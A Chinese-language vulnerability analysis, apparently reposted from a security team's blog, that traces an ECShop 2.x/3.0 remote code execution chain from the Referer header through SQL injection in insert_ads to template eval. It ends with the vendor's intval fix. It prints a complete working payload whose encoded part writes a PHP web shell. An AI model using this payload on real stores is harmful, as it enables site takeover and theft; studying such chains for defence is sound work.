***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 0x00 前言

 **ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。2.x版本跟3.0版本存在代码执行漏洞。**

## 0x01 漏洞原理

ECShop 没有对 $GLOBAL[‘_SERVER’][‘HTTP_REFERER’]
变量进行验证，导致用户可以将任意代码插入的user_passport.dwt模板中，随后insert_mod根据模板内容动态执行相应的函数，用户插入恶意代码导致模板动态执行了lib_insert下的
insert_ads 方法，通过SQL注入，返回构造的执行代码，致使后面调用cls_template模板类的fetch函数，成功执行恶意代码。

## 0x02 环境搭建

IDE : PHPStorm

PHP: 5.4

ECshop 3.0

ECShop 2.7.3

## 0x03 分析过程

### 整体功能

首先过一下整体的功能，进入到user.php中。

![图片-1.png](https://image.3001.net/images/20180905/15361441751118.png!small)

正常情况下，程序会将$GLOBALS[‘_SERVER’][‘HTTP_REFERER’]
赋值给了$back_act，接着通过cls_template模板类的assign和display进行赋值和和传值给了user_passport.dwt页面模板；这时候user_passport.dwt页面模板的内容是这样子的。

![图片-2.png](https://image.3001.net/images/20180905/15361441692539.png!small)

进入到$smarty->display中，通过inser_mod的分割和反序列之后动态调用函数获得购物信息和会员信息，将会默认执行user_passport.dw上面的两个函数，即lib_insert函数类下的insert_cart_info和insert_member_info函数。

    
    
    insert_cart_info函数//调用购物信息
    insert_member_info函数 //调用会员信息
    

user_passport.dw模板：

![图片-3.png](https://image.3001.net/images/20180905/15361441455486.png!small)

inser_mod函数：

![图片-4.png](https://image.3001.net/images/20180905/15361441244822.png!small)

### Payload

    
    
    45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4975634768774A79776E50443977614841675A585A686243676B58314250553152624D5445784D5630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}
    

### 开始分析

在user.php 中的通过执行登陆操作的时候，将$GLOBALS[‘_SERVER’][‘HTTP_REFERER’]的值修改为我们的代码：

![图片-5.png](https://image.3001.net/images/20180905/15361442128843.png!small)

这时候$back_act的值就是我们篡改之后的REFERER值了，之后程序会继续执行：

    
    
    $smarty->assign('back_act', $back_act);  //赋值
    $smarty->display('user_passport.dwt'); //传值到模板上 
    

经过assign，display的赋值和传值之后，这时候user_passport.dwt模板上的back_act值是这样的：

![图片-6.png](https://image.3001.net/images/20180905/15361442417805.png!small)在观察堆栈参数的时候，可以观察到this->_echash
的值跟我们的Payload的值是一样的，这是ECSHOP的固定的HASH值，2.7版本的_echash值为554fcae493e564ee0dc75bdf2ebf94ca而3.x版本的_echash值为45ea207d7a2b68c49582d2d22adf953，所以所用的Payload也不一样。

![图片-7.png](https://image.3001.net/images/20180905/15361442683247.png!small)

进入到display函数中，会执行fetch函数，获得页面模板内容；

    
    
    $out = $this->fetch($filename, $cache_id); //根据$cache_id获取模板内容也就是user_passport.dwt的内容
    

接着按照_echash的值也就是固定hash值进行分割；

![图片-8.png](https://image.3001.net/images/20180905/15361442918761.png!small)

分割完之后程序会先执行两个默认函数，然后才执行我们的代码，继续执行insert_mod函数 。

    
    
    $k[$key] = $this->insert_mod($val);
    

跟进，可以看到我们输入的字符串根据“|”进行了分割，并分别赋值给了$fun和$para  

    
    
    所以最后的到的值类似于$fun = insert_ads $para = array(‘num’=>”*/union…”,’id’=>”*/”)
    

![图片-10.png](https://image.3001.net/images/20180905/15361443801973.png!small)

到了`return $fun($para);`这里，将会执行lib_insert动态函数类下的 `insert_ads($para)`函数。

跟进，可以看到这里执行了SQL语句，而`$arr[‘id’]`和`$arr[‘num’]`这两个参数正是我们传进来的数组中的内容，参数可控，从而导致了注入。

![图片-17.png](https://image.3001.net/images/20180905/15361444159.png!small)

这时候在数据库中，执行的语句为：

    
    
    SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop3_0`.`ecs_ad` AS a LEFT JOIN `ecshop3_0`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1536052713' AND end_time >= '1536052713' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 1,0x272f2a,3,4,5,6,7,8,0x,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4975634768774A79776E50443977614841675A585A686243676B58314250553152624D5445784D5630704F79412F506963702729293B2F2F7D787878,10-- -
![图片-11.png](https://image.3001.net/images/20180905/15361445635695.png!small)可以看到数据库的position_id和position_style字段分别被union
select 查询覆盖为了`'/*`
和`{$asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//}xxx`  

![图片-12.png](https://image.3001.net/images/20180905/15361445779395.png!small)

查询结束之后,根据$position_style的值执行了cls_template模板类的fetch函数。

    
    
    $val = $GLOBALS[‘smarty’]->fetch($position_style); //执行了smarty的fetch函数
    

跟进，看到这里，这里最终执行了恶意代码。

    
    
    $out = $this->_eval($this->fetch_str(substr($filename, 4))); //最终执行了语句
    

看一下内部的字符串处理，传入filename的值为：

    
    
    ” str:{$asd’];assert(base64_decode(‘ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp’));//}xxx”
    

然后使用substr对filenname进行切割，接着进入到$this->fetch_str中，可以看到fetch_str函数的返回内容为`<?php
echo xx>`格式的。

![图片-13.png](https://image.3001.net/images/20180905/15361446014905.png!small)在跟入到$this->get_val中，执行了`$p
= $this->make_var($val);` ，跟入到make_var函数中。

![图片-14.png](https://image.3001.net/images/20180905/15361446292915.png!small)

字符串处理最后返回的值为：

    
    
    $this->_var['asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//'] 
    

拼接在一起，最后返回的数据为：

    
    
    <?php echo $this->_var['asd'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzIucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTExMV0pOyA/Picp'));//>
    

从而最终导致了代码执行。

![图片-15.png](https://image.3001.net/images/20180905/15361446571622.png!small)

## 0x04 代码执行的调用链

![图片-16.png](https://image.3001.net/images/20180905/15361446773523.png!small)

## 0x05 修复方案

在ECShop3.6版本中insert_ads函数对$arr[‘num’]和$arr[‘id’]进行了强制类型转换。

    
    
    $arr[‘num’] = intval($arr[‘num’]);
    $arr['id'] = intval($arr['id']);

***本文作者：[斗象能力中心TCC](https://blog.riskivy.com/ecshop-2-x-3-0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)，转载请注明来自FreeBuf.COM**

